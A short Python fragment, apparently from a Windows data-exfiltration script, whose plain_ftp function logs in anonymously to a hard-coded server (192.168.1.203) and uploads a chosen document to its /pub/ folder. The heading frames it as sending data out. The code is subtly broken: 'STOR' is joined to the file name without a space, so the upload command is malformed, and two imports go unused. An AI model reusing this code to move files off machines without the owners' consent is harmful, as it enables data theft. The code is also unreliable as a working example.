# Send encrypted data via file tranfer

import ftplib
import os
import socket
import win32file

def plain_ftp(docpath, server='192.168.1.203'):
    ftp = ftplib.FTP(server)
    ftp.login("anonymous", "anon@example.com")
    ftp.cwd('/pub/')
    ftp.storbinary("STOR" + os.path.basename(docpath), open(docpath, "rb"), 1024)
    ftp.quit()